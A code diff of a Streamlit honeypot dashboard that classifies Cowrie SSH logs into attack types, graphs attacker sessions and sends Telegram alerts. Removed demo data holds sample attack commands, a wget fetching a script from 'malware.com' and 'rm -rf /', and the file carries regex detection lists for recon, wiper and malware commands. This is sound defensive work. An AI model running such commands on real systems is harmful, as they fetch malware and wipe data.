@@ -5,13 +5,14 @@ from psycopg2.extras import RealDictCursor
 import json
 import requests
 from confluent_kafka import Consumer, KafkaError
-import networkx as nx
+from streamlit_autorefresh import st_autorefresh
 from pyvis.network import Network
 import streamlit.components.v1 as components
+import networkx as nx
 import tempfile
 import os
 import re
-from datetime import datetime, timedelta
+from datetime import datetime
 
 # --- Configuration ---
 DB_HOST = "aws-0-ap-southeast-1.pooler.supabase.com"
@@ -52,38 +53,31 @@ RECON_PATTERNS = [
     r"ss\s+-tuln"
 ]
 
-BRUTE_FORCE_THRESHOLD = 5  # Failed login attempts to trigger alert
+BRUTE_FORCE_THRESHOLD = 5
 
-# --- Enhanced Functions ---
+# --- Fixed Functions ---
 
-def send_telegram_alert(alert_data):
-    """Improved alerting with attack-specific details"""
-    emoji = {
-        "Brute Force": "🔐",
-        "Malware": "🦠",
-        "Wiper": "💥",
-        "Recon": "🕵️"
-    }.get(alert_data.get("attack_type"), "⚠️")
-    
-    message = (
-        f"{emoji} <b>GraphPot Alert: {alert_data.get('attack_type', 'Security Event')}</b>\n\n"
-        f"<b>Source IP:</b> {alert_data.get('src_ip', 'N/A')}\n"
-        f"<b>Target:</b> {alert_data.get('dst_port', 'N/A') or alert_data.get('target', 'N/A')}\n"
-        f"<b>Timestamp:</b> {alert_data.get('timestamp', datetime.now().isoformat())}\n"
-        f"<b>Evidence:</b> <code>{alert_data.get('evidence', 'N/A')[:200]}</code>"
-    )
-    
+def send_telegram_alert(data, source="Manual"):
     try:
-        requests.post(
-            f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-            data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+        alert_message = (
+            f"🚨 <b>New {source} Data Inserted</b>\n\n"
+            f"<b>Source IP:</b> {data.get('src_ip', 'N/A')}\n"
+            f"<b>Event:</b> {data.get('eventid', 'N/A')}\n"
+            f"<b>Message:</b> {data.get('message', 'N/A')}\n"
+            f"<b>Time:</b> {data.get('timestamp', 'N/A')}"
         )
+        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
+        payload = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": alert_message,
+            "parse_mode": "HTML"
+        }
+        requests.post(url, data=payload)
     except Exception as e:
-        st.error(f"Telegram alert failed: {str(e)}")
+        st.error(f"Failed to send Telegram alert: {e}")
 
 @st.cache_resource
-def get_db_connection():
-    """Enhanced connection with retries"""
+def get_connection():
     return psycopg2.connect(
         host=DB_HOST,
         dbname=DB_NAME,
@@ -94,173 +88,220 @@ def get_db_connection():
         sslmode='require'
     )
 
-def detect_attack_type(log_entry):
-    """Enhanced multi-layer attack detection"""
-    eventid = log_entry.get('eventid', '').lower()
-    message = str(log_entry.get('message', '')).lower()
-    input_cmd = str(log_entry.get('input', '')).lower()
-    src_ip = log_entry.get('src_ip')
+def detect_attack_type(row):
+    """Fixed to always return tuple (attack_type, details)"""
+    eventid = row.get('eventid', '').lower()
+    input_cmd = str(row.get('input', '')).lower()
+    message = str(row.get('message', '')).lower()
     
-    # Layer 1: Event-based detection
+    attack_type = "Unknown Activity"
+    details = message[:100] if message else "No details"
+    
     if eventid == 'cowrie.login.failed':
-        # Layer 2: Brute-force pattern
-        if int(log_entry.get('attempt_count', 0)) >= BRUTE_FORCE_THRESHOLD:
-            return "Brute Force Attack", f"Multiple failed logins ({log_entry.get('attempt_count')} attempts)"
-    
+        attack_type = "Brute Force Attack"
+        details = f"Failed login attempt from {row.get('src_ip')}"
+    elif eventid == 'cowrie.login.success':
+        attack_type = "Successful Login"
     elif eventid == 'cowrie.command.input':
-        # Layer 3: Pattern matching
-        for pattern in WIPER_PATTERNS:
-            if re.search(pattern, input_cmd):
-                return "Wiper Attack", f"Detected command: {input_cmd[:50]}..."
-                
-        for pattern in MALWARE_PATTERNS:
-            if re.search(pattern, input_cmd):
-                return "Malware Download", f"Download attempt: {input_cmd[:50]}..."
-                
-        for pattern in RECON_PATTERNS:
-            if re.search(pattern, input_cmd):
-                return "Reconnaissance", f"Recon command: {input_cmd[:50]}..."
-    
+        if any(re.search(p, input_cmd) for p in WIPER_PATTERNS):
+            attack_type = "Destructive Attack (Wiper)"
+            details = f"Wiper command: {input_cmd[:50]}..."
+        elif any(re.search(p, input_cmd) for p in MALWARE_PATTERNS):
+            attack_type = "Malware Download Attempt"
+            details = f"Download attempt: {input_cmd[:50]}..."
+        elif any(re.search(p, input_cmd) for p in RECON_PATTERNS):
+            attack_type = "Reconnaissance / Enumeration"
+            details = f"Recon command: {input_cmd[:50]}..."
+        else:
+            attack_type = "Command Injection Attempt"
     elif eventid == 'cowrie.session.connect':
-        # Port scan detection
-        if log_entry.get('dst_port'):
-            return "Port Scanning", f"Connection to port {log_entry.get('dst_port')}"
+        attack_type = "Port Scanning / Connection Attempt"
+        details = f"Connection to port {row.get('dst_port')}"
     
-    # Default classification
-    return "Suspicious Activity", message[:100]
+    return attack_type, details
 
-def load_attack_data(hours=24):
-    """Load data with time-based filtering"""
-    conn = get_db_connection()
-    query = """
-        SELECT *, 
-               COUNT(*) OVER (PARTITION BY src_ip, eventid) as attempt_count
-        FROM hornet7_data 
-        WHERE timestamp >= NOW() - INTERVAL '%s hours'
-        ORDER BY timestamp DESC
-    """ % hours
-    return pd.read_sql(query, conn)
+def load_data():
+    conn = get_connection()
+    with conn.cursor() as cur:
+        cur.execute("SELECT * FROM hornet7_data ORDER BY timestamp DESC LIMIT 1000;")
+        rows = cur.fetchall()
+    df = pd.DataFrame(rows)
+    
+    # Fixed DataFrame assignment
+    df[['attack_type', 'attack_details']] = df.apply(
+        lambda x: pd.Series(detect_attack_type(x)), 
+        axis=1
+    )
+    return df
 
-def generate_attack_graph(attack_df):
-    """Enhanced visualization with attack-specific nodes"""
+# --- Enhanced Graph Modeling ---
+def build_session_graph(row):
     G = nx.DiGraph()
+    src_ip = row.get('src_ip')
+    eventid = row.get('eventid')
+    dst_port = row.get('dst_port')
+    timestamp = row.get('timestamp')
+    attack_type, details = detect_attack_type(row)
+
+    # Node styling based on attack type
+    node_colors = {
+        "Brute Force Attack": "#FF6B6B",
+        "Destructive Attack (Wiper)": "#FF0000",
+        "Malware Download Attempt": "#FFA500",
+        "Reconnaissance / Enumeration": "#ADD8E6",
+        "Port Scanning / Connection Attempt": "#90EE90"
+    }
     
-    for _, row in attack_df.iterrows():
-        src_ip = row.get('src_ip')
-        if not src_ip:
-            continue
-            
-        attack_type, details = detect_attack_type(row)
-        color = {
-            "Brute Force Attack": "#FF6B6B",
-            "Wiper Attack": "#FF0000",
-            "Malware Download": "#FFA500",
-            "Reconnaissance": "#ADD8E6"
-        }.get(attack_type, "#888888")
-        
-        G.add_node(src_ip, label=f"Attacker\n{src_ip}", color=color, shape="box")
-        
-        target = f"{attack_type}\n{row.get('dst_port', '')}"
-        G.add_node(target, label=target, color="#F0F0F0", shape="ellipse")
-        G.add_edge(src_ip, target, label=details[:30], color=color)
+    # Add nodes with enhanced information
+    if src_ip:
+        G.add_node(src_ip, 
+                  label=f"Attacker\n{src_ip}",
+                  color=node_colors.get(attack_type, "lightblue"),
+                  title=f"First seen: {timestamp}",
+                  shape="box")
+    
+    if eventid:
+        G.add_node(eventid, 
+                  label=f"Event\n{eventid}",
+                  color="#F0F0F0",
+                  title=details,
+                  shape="ellipse")
+    
+    if dst_port:
+        port_node = f"Port {dst_port}"
+        G.add_node(port_node, 
+                  label=port_node,
+                  color="#D8BFD8",
+                  shape="diamond")
+    
+    # Add edges with attack details
+    if src_ip and eventid:
+        G.add_edge(src_ip, eventid, 
+                  title=f"Attack Type: {attack_type}\n{details}",
+                  color=node_colors.get(attack_type, "grey"))
+    
+    if eventid and dst_port:
+        G.add_edge(eventid, f"Port {dst_port}", 
+                  title=f"Target port {dst_port}",
+                  color="#888888")
     
     return G
 
-# --- Streamlit UI ---
-st.set_page_config(page_title="GraphPot Threat Dashboard", layout="wide")
-st.title("🛡️ GraphPot Threat Dashboard")
+# --- Original Dashboard Layout ---
+st.set_page_config(page_title="GraphPot - Network Session Analysis", layout="wide")
+st.title("🛡️ GraphPot - Network Session Analysis")
 
-# Sidebar filters
-with st.sidebar:
-    st.header("Filters")
-    hours = st.slider("Time window (hours)", 1, 72, 24)
-    attack_types = st.multiselect(
-        "Attack types",
-        ["Brute Force", "Malware", "Wiper", "Reconnaissance"],
-        default=["Brute Force", "Wiper"]
-    )
+if st.button("🔄 Refresh"):
+    st.rerun()
 
-# Main dashboard
-tab1, tab2, tab3 = st.tabs(["Threat Overview", "Attack Details", "Live Monitoring"])
+st.markdown("---")
 
-with tab1:
-    st.header("Threat Landscape")
-    
-    # Load and classify data
-    df = load_attack_data(hours)
-    df[['attack_type', 'attack_details']] = df.apply(
-        lambda x: detect_attack_type(x), 
-        axis=1, 
-        result_type="expand"
-    )
-    
-    # Filter by selected attack types
-    if attack_types:
-        df = df[df['attack_type'].isin(attack_types)]
-    
-    # Metrics
+df = load_data()
+
+if not df.empty:
+    # --- Summary Metrics ---
+    st.subheader("📊 Attack Summary")
     col1, col2, col3, col4 = st.columns(4)
-    col1.metric("Brute Force", df[df['attack_type'] == "Brute Force Attack"].shape[0], delta="High Risk")
-    col2.metric("Malware", df[df['attack_type'] == "Malware Download"].shape[0])
-    col3.metric("Wiper", df[df['attack_type'] == "Wiper Attack"].shape[0], delta="Critical")
-    col4.metric("Recon", df[df['attack_type'] == "Reconnaissance"].shape[0])
-    
-    # Attack graph
-    st.subheader("Attack Pattern Visualization")
-    G = generate_attack_graph(df)
-    
-    net = Network(height="600px", width="100%", directed=True)
-    net.from_nx(G)
-    
-    with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
-        net.save_graph(tmp_file.name)
-        components.html(open(tmp_file.name, 'r', encoding='utf-8').read(), height=650)
-    os.unlink(tmp_file.name)
+    col1.metric("🔒 Brute Force", (df['attack_type'] == "Brute Force Attack").sum())
+    col2.metric("🐍 Malware Download", (df['attack_type'] == "Malware Download Attempt").sum())
+    col3.metric("🔥 Wiper Attack", (df['attack_type'] == "Destructive Attack (Wiper)").sum())
+    col4.metric("🕵️ Reconnaissance", (df['attack_type'] == "Reconnaissance / Enumeration").sum())
 
-with tab2:
-    st.header("Detailed Attack Logs")
-    
-    # Enhanced data display
-    st.dataframe(
-        df[['timestamp', 'src_ip', 'attack_type', 'attack_details', 'dst_port']]
-        .sort_values('timestamp', ascending=False)
-        .style.applymap(lambda x: "background-color: #FFCCCC" if x == "Wiper Attack" else "", 
-                      subset=['attack_type']),
-        use_container_width=True
+    st.markdown("---")
+
+    # Highlight Table
+    def highlight_rows(row):
+        if row['attack_type'] == 'Destructive Attack (Wiper)':
+            return ['background-color: #FFB6B6'] * len(row)
+        elif row['attack_type'] == 'Malware Download Attempt':
+            return ['background-color: #FFF3CD'] * len(row)
+        elif row['attack_type'] == 'Brute Force Attack':
+            return ['background-color: #D1ECF1'] * len(row)
+        elif row['attack_type'] == 'Reconnaissance / Enumeration':
+            return ['background-color: #E2E3E5'] * len(row)
+        else:
+            return [''] * len(row)
+
+    st.subheader("📋 Latest Captured Sessions")
+    attack_filter = st.selectbox("🔍 Filter by Attack Type:", options=["All"] + sorted(df['attack_type'].unique()))
+
+    if attack_filter != "All":
+        df = df[df['attack_type'] == attack_filter]
+
+    st.dataframe(df.style.apply(highlight_rows, axis=1), use_container_width=True)
+
+    st.markdown("---")
+
+    # Network Session Mapping
+    st.subheader("🧠 Enhanced Attack Graph")
+    selected_session = st.selectbox(
+        "Select a Session ID to visualize:",
+        options=df['session'].unique()
     )
-    
-    # Attack statistics
-    st.subheader("Attack Statistics")
-    st.bar_chart(df['attack_type'].value_counts())
 
-with tab3:
-    st.header("Real-time Monitoring")
-    
-    if st.button("Start Live Capture"):
-        kafka_placeholder = st.empty()
+    if selected_session:
+        selected_row = df[df['session'] == selected_session].iloc[0]
+        G = build_session_graph(selected_row)
         
-        # Simulate live updates (replace with actual Kafka consumer)
-        sample_attacks = [
-            {"src_ip": "192.168.1.10", "eventid": "cowrie.login.failed", "attempt_count": 6},
-            {"src_ip": "10.0.0.5", "eventid": "cowrie.command.input", "input": "wget http://malware.com/virus.sh"},
-            {"src_ip": "172.16.0.3", "eventid": "cowrie.command.input", "input": "rm -rf /"}
-        ]
+        # Enhanced PyVis visualization
+        net = Network(height="700px", width="100%", directed=True, notebook=False)
+        net.barnes_hut(
+            gravity=-1000,
+            central_gravity=0.3,
+            spring_length=200,
+            spring_strength=0.05,
+            damping=0.09,
+            overlap=0.5
+        )
         
-        for attack in sample_attacks:
-            attack_type, details = detect_attack_type(attack)
-            kafka_placeholder.info(f"🚨 {attack_type} detected from {attack['src_ip']}: {details}")
-            
-            # Send alert
-            send_telegram_alert({
-                "attack_type": attack_type,
-                "src_ip": attack['src_ip'],
-                "evidence": attack.get('input', ''),
-                "timestamp": datetime.now().isoformat()
-            })
-            
-            # Small delay for demo effect
-            import time
-            time.sleep(2)
+        # Add nodes with custom properties
+        for node, data in G.nodes(data=True):
+            net.add_node(
+                node, 
+                label=data.get("label", node),
+                color=data.get("color", "#97C2FC"),
+                shape=data.get("shape", "dot"),
+                title=data.get("title", ""),
+                size=25 if "Attacker" in str(data.get("label", "")) else 20
+            )
+        
+        # Add edges with custom properties
+        for src, dst, data in G.edges(data=True):
+            net.add_edge(
+                src, dst,
+                title=data.get("title", ""),
+                color=data.get("color", "gray"),
+                width=2,
+                arrows="to"
+            )
+        
+        # Generate and display the graph
+        with tempfile.NamedTemporaryFile(delete=False, suffix=".html") as tmp_file:
+            net.save_graph(tmp_file.name)
+            components.html(open(tmp_file.name, 'r', encoding='utf-8').read(), height=750)
+        os.unlink(tmp_file.name)
+
+        # Session Overview
+        attack_info = f"""
+        📄 **Session Overview**  
+        **Source IP:** {selected_row.get('src_ip', 'N/A')}  
+        **Attack Type:** `{selected_row['attack_type']}`  
+        **Target Port:** {selected_row.get('dst_port', 'N/A')}  
+        **First Seen:** {selected_row.get('timestamp', 'N/A')}  
+        **Details:** {selected_row.get('attack_details', 'N/A')}
+        """
+        
+        if selected_row['attack_type'] == "Destructive Attack (Wiper)":
+            st.error(attack_info)
+        elif selected_row['attack_type'] == "Malware Download Attempt":
+            st.warning(attack_info)
+        elif selected_row['attack_type'] in ["Brute Force Attack", "Reconnaissance / Enumeration"]:
+            st.info(attack_info)
+        else:
+            st.success(attack_info)
+
+else:
+    st.warning("⚠️ No data found.")
 
 # Auto-refresh every 60 seconds
 st_autorefresh(interval=60000, key="data_refresh")
